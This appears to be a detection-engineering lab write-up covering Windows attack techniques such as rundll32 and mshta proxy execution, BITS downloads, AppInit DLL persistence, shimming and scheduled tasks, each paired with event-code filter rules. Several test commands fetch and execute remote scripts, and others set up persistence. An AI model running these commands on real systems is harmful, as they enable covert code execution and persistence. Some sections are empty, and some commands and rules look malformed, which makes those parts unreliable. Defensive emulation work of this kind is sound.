_______________________________________________________________________________________________________________
Technique Description: Rundll32.exe 
------------------------------------
Rundll32.exe is a Windows program that allows for execution of binaries. This can be used by attackers as a defense evasion 
tactic as well as an execution tactic because it can be used as a proxy to run their malicious code since the process may 
not be monitored due to false positives.  

Assumptions 
-------------

 Execution (test script used) 
-------------
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"


 Detection 
-------------
 Visibility 
-------------
A binary run through rundll32.exe will generate an Event ID 1 on Windows 7 through Sysmon operational logs as Process Create. 
When the script or binary is finished execution it will trigger EventID 5 Process Termination.  

Filter/ Correlation Rule 
---------------
EventCode=4656 OR EventCode=1 AND rundll32.exe
![rundll32](https://user-images.githubusercontent.com/32250546/55583319-9a745b00-56ef-11e9-897b-5d4d02a65380.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: Scripting 
------------------------------------
Technical Description: Attackers can use scripts to assist and create actions that could possibly done manually. Scripting allows for the attacks to be run faster which enables them to be able to gain access to the victim faster. Scripting can also bypass process monitoring devices by working with the operating system at the API level [2]. 

Assumptions 
-------------
We assume that, malicious code has been injected through Spearphishing link as its initial access into the end point.

Execution (test script used) 
-------------
From cmd line: .\testscript.ps1

 Detection 
-------------
Scripting is more likely to perform by admin, developer, or power user systems. Running script for an non-authorized person or end point is highly suspicious. Monitoring processes and arguments for scrip execution is highly recommended [2].

 Visibility 
-------------
A powershell script run

Filter/ Correlation Rule 
---------------

![scripting](https://user-images.githubusercontent.com/32250546/55583929-0c996f80-56f1-11e9-9ae8-7acb09cccf3d.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: AppInit DLLS
------------------------------------
DLLS specified in AppInit DLL values which are in the registry keys. The keys are run by user32.dll. 

Assumptions 
-------------
We assume, after initial access through Spearphishing link a malware is running script to make malware persistent through Applnit DLLs technique. 

Execution (test script used) 
-------------
From cmd line: reg import handler.reg

 Detection 
-------------
Monitoring DDL that are loaded by user32.dll and looking for abnormal DLLs that are loaded into process. We can also monitor AppInit_DLLs registry for any changes that aren’t correlated with software [3].

 Visibility 
-------------
Regmon.exe

Filter/ Correlation Rule 
---------------
EventCode=4688 OR EventCode=1 AND reg.exe
![appinit DLLS](https://user-images.githubusercontent.com/32250546/55584086-71ed6080-56f1-11e9-9908-17df1f321070.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: BITS Jobs
------------------------------------
Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth used to transfer file through exposed Component Object Model (COM) [4]. BITS is used by updates, messengers and other applications preferred to operate in the background.

Assumptions 
-------------
We assume, BITS has been used to make malicious code persistent.  

Execution (test script used) 
-------------
From cmd line: bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1

 Detection 
-------------
bitsadmin.exe
 Visibility 
-------------
bitsadmin.exe

Filter/ Correlation Rule 
---------------
EventCode=4658 OR EventCode=1 AND bitsadmin

![bits](https://user-images.githubusercontent.com/32250546/55584236-c98bcc00-56f1-11e9-8153-cac3478ebc73.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: Mshta
------------------------------------
Mshta.exe is used to execute Microsoft HTML Applications (HTA). Attackers use mshata.exe to proxy execution of malicious files and Javascript or VBscript by going through Windows utility.  Mshta.exe can bypass application whitelisting.

Assumptions 
-------------

Execution (test script used) 
-------------
From cmd line: mshta.exe javascript:a=(GetObject('script: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

 Detection 
-------------
mshta
 Visibility 
-------------
mshta

Filter/ Correlation Rule 
---------------
EventCode=4658 OR EventCode=3 AND mshta.exe 
![mshta](https://user-images.githubusercontent.com/32250546/55584524-5b93d480-56f2-11e9-9e99-863e684054c4.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: NTFS File Attributes
------------------------------------
Adversaries can store payloads in NTFS alternate data streams to avoid detection and then can run the payload using a number of different ways. 

Assumptions 
-------------

Execution (test script used) 
-------------
From CMD line:
![cmd](https://user-images.githubusercontent.com/32250546/55584579-82520b00-56f2-11e9-8a56-ce758844268a.png)

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
EventCode=1 AND *:payload.exe
![payload](https://user-images.githubusercontent.com/32250546/55584649-b5949a00-56f2-11e9-82d7-5cd27e08b4c4.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: 
------------------------------------
attackers try to create an executable or file that will be hard to discover by encrypting, encoding or obfuscating contains on the system. It is used to get across platforms and network to avoid detection. 

Assumptions 
-------------

Execution (test script used) 
-------------
This technique was not feasable

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------

----------------------------------------------------------------------------------------------------------------
Technique Description: Network Sniffing
------------------------------------
Network sniffing is to monitor or capture information that is going through the wired or wireless connection. The attacker may put a network interface in promiscuous mode so that they can access data when the data is in transit over network. 

Assumptions 
-------------

Execution (test script used) 
-------------
From cmd line:  c:\Program Files\Wireshark\tshark.exe -i #{interface} -c 5c:\windump.exe

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
4646 file system or 4658 look for dumpcap.exe or tshark.exe
![network](https://user-images.githubusercontent.com/32250546/55592342-22655f80-5706-11e9-9755-c2c78652248f.png)
----------------------------------------------------------------------------------------------------------------
Technique Description: System Network Connections Discovery
------------------------------------
The attacker attempts to get all the network connections to or from the victims system that they are accessing.  

Assumptions 
-------------

Execution (test script used) 
-------------
In CMD line:
netstat
Net use
sessions

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
EventID=1 AND cmdline="netstat" OR cmdline="net use" OR cmdline="sessions"

----------------------------------------------------------------------------------------------------------------
Technique Description:	System Owner/User Discovery
------------------------------------
Attacker attempts to find the primary users, logged in users, set of users that use system, or if user is actively on the system. The information are collected in many ways with Discovery techniques.  

Assumptions 
-------------

Execution (test script used) 
-------------
From cmd line:

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
(EventCode=4658 OR EventCode=4656 OR EventCode=4648) AND (Quser.exe OR Qwinsta.exe OR wmic.exe)
![owner](https://user-images.githubusercontent.com/32250546/55592388-46c13c00-5706-11e9-91c3-3975e54ff268.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: Application Shimming
------------------------------------


Assumptions 
-------------

Execution (test script used) 
-------------
From cmd line:  sdbinst.exe AtomicShimx86.sdb
![cmd](https://user-images.githubusercontent.com/32250546/55592444-753f1700-5706-11e9-961e-3d3f0a10abad.png)

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
EventCode=4688 AND sdbinst.exe
![app](https://user-images.githubusercontent.com/32250546/55592461-7c662500-5706-11e9-8c7d-b2b266fe0ef6.png)

----------------------------------------------------------------------------------------------------------------
Technique Description: Scheduled Task
------------------------------------


Assumptions 
-------------

Execution (test script used) 
-------------
SCHTASKS /Create /SC ONCE /TN spawn /TR “C:\windows\system32\cmd.exe” /ST 11:20:00

 Detection 
-------------

 Visibility 
-------------

Filter/ Correlation Rule 
---------------
EventCode=4698 OR EventCode=4699 OR EventCode=4700 OR EventCode=4701 OR EventCode=4702
![sch](https://user-images.githubusercontent.com/32250546/55593349-702f9700-5709-11e9-8ecd-f40e0b8d0ccf.png)
